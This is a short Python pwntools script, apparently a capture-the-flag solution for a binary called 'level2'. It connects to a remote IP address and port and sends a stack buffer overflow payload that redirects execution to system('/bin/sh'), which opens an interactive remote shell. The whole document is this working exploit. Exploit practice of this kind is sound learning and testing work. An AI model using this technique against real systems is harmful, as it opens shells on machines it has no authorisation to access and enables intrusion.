```
from pwn import *
context.log_level='debug'
sh=remote('61.147.171.105',54944)
elf=ELF('./level2')
system_addr=elf.symbols['system']
binsh_addr=elf.search('/bin/sh').__next__()
payload=b'a'*(0x88+0x4)+p32(system_addr)+p32(0)+p32(binsh_addr)
sh.sendlineafter('Input',payload)
sh.interactive()
```